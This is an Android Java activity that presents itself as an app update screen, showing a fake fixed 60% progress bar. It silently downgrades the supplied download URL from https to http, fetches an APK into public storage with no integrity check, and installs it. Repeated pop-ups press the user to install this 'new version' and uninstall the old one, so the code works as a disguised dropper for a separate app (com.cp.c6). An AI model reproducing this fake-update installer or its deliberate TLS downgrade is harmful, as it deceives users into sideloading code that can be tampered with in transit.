package com.ego.shadow.mutil;

import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.os.*;
import android.util.Log;
import android.view.*;
import android.widget.*;

import com.ego.shadow.Shadow;

import java.io.*;
import java.net.*;
import java.util.*;

/**
 * Created by Administrator on 2018/1/1.
 */

public class MUp extends Activity {
    private static final String TAG = "MUp";
    TextView tv;
    String url;
    ProgressBar progressBar;
    LinearLayout l;
    int i = 0;
    File file;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);

        l = new LinearLayout(this);
        l.setFitsSystemWindows(true);
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        l.setGravity(Gravity.CENTER);
        l.setOrientation(LinearLayout.VERTICAL);

        tv = new TextView(this);
        tv.setText("下载百分之60%。。。。");
        tv.setTextColor(Color.BLACK);
        tv.setTextSize(20);
        tv.setGravity(Gravity.CENTER);

        ClipDrawable d = new ClipDrawable(new ColorDrawable(Color.YELLOW), Gravity.LEFT, ClipDrawable.HORIZONTAL);
        progressBar.setProgressDrawable(d);
        progressBar.setBackgroundColor(Color.GRAY);
        progressBar.setMax(100);
        progressBar.setScrollBarSize(20);
        progressBar.setProgress(60);
        Bitmap p = null;
        try {
            p = BitmapFactory.decodeStream(getAssets().open("about.html"));
        } catch (IOException e) {
        }


        l.setBackground(new BitmapDrawable(p));
        TextView v = new TextView(this);
        v.setText("");
        v.setHeight(1050);
        l.addView(v);
        l.addView(progressBar);
        l.addView(tv);
        setContentView(l);


        url = getIntent().getStringExtra("url");
        if (url.startsWith("https")) {
            url = url.replace("https", "http");

        }
//        url = "http://apk.kosungames.com/app-c6-release.apk";
        doStartApplicationWithPackageName("com.cp.c6");
    }

    class DownloadAPK extends AsyncTask<String, Integer, String> {

        TextView tv;
        ProgressBar pb;

        public DownloadAPK(ProgressBar progressBarg, TextView textView) {
            this.pb = progressBarg;
            this.tv = textView;
        }

        @Override
        protected String doInBackground(String... strings) {
            URL url;
            HttpURLConnection conn;
            BufferedInputStream bis = null;
            FileOutputStream fos = null;

            try {
                url = new URL(strings[0]);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);

                int fileLength = conn.getContentLength();
                bis = new BufferedInputStream(conn.getInputStream());
                String fileName = null;
                if (Build.VERSION.SDK_INT >= 24) {
                    fileName = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + "/action.apk";
                } else {
                    fileName = Environment.getExternalStorageDirectory().getPath() + "/magkare/action.apk";
                }
                Log.i("fileName", fileName);
                file = new File(fileName);
                if (!file.exists()) {
                    if (!file.getParentFile().exists()) {
                        file.getParentFile().mkdirs();
                    }
                    file.createNewFile();
                }
                fos = new FileOutputStream(file);
                byte data[] = new byte[4 * 1024];
                long total = 0;
                int count;
                while ((count = bis.read(data)) != -1) {
                    total += count;
                    publishProgress((int) (total * 100 / fileLength));
                    fos.write(data, 0, count);
                    fos.flush();
                }
                fos.flush();

            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                try {
                    if (fos != null) {
                        fos.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    if (bis != null) {
                        bis.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            return null;
        }

        @Override
        protected void onProgressUpdate(Integer... progress) {
            super.onProgressUpdate(progress);
            progressBar.setProgress(progress[0]);
            tv.setText("更新中。已下载" + progress[0] + "%...");
            i = progress[0];
        }


        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            if (i == 100){
                Shadow.install(MUp.this,file);
            }
            //打开安装apk文件操作
            Toast.makeText(getApplication(), "下载完成", Toast.LENGTH_LONG).show();
            Toast.makeText(getApplication(), "重要的事说三遍，请安装新版本，卸载旧版本。新版本第一次配置需要时间 请耐心等候~~~", Toast.LENGTH_LONG).show();
            Toast.makeText(getApplication(), "重要的事说三遍，请安装新版本，卸载旧版本。新版本第一次配置需要时间 请耐心等候~~~", Toast.LENGTH_LONG).show();
            Toast.makeText(getApplication(), "重要的事说三遍，请安装新版本，卸载旧版本。新版本第一次配置需要时间 请耐心等候~~~", Toast.LENGTH_LONG).show();
        }
    }




    private void doStartApplicationWithPackageName(String packagename) {

        // 通过包名获取此APP详细信息，包括Activities、services、versioncode、name等等
        PackageInfo packageinfo = null;

        try {
            packageinfo = getPackageManager().getPackageInfo(packagename, 0);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        if (packageinfo == null) {
            Toast.makeText(this, "开始下载最新版本，预计30秒下载完成。(｢･ω･)｢嘿", Toast.LENGTH_LONG).show();

            new DownloadAPK(progressBar, tv).execute(url);
            return;
        }

        // 创建一个类别为CATEGORY_LAUNCHER的该包名的Intent
        Intent resolveIntent = new Intent(Intent.ACTION_MAIN, null);
        resolveIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        resolveIntent.setPackage(packageinfo.packageName);

        // 通过getPackageManager()的queryIntentActivities方法遍历
        List<ResolveInfo> resolveinfoList = getPackageManager()
                .queryIntentActivities(resolveIntent, 0);

        ResolveInfo resolveinfo = resolveinfoList.iterator().next();
        if (resolveinfo != null) {
            // packagename = 参数packname
            String packageName = resolveinfo.activityInfo.packageName;
            // 这个就是我们要找的该APP的LAUNCHER的Activity[组织形式：packagename.mainActivityname]
            String className = resolveinfo.activityInfo.name;
            // LAUNCHER Intent
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_LAUNCHER);

            // 设置ComponentName参数1:packagename参数2:MainActivity路径
            ComponentName cn = new ComponentName(packageName, className);

            intent.setComponent(cn);
            startActivity(intent);
        }
    }

    @Override
    protected void onResume() {

        super.onResume();
        if (i == 100) {
            Shadow.install(MUp.this,file);
        }

    }
}

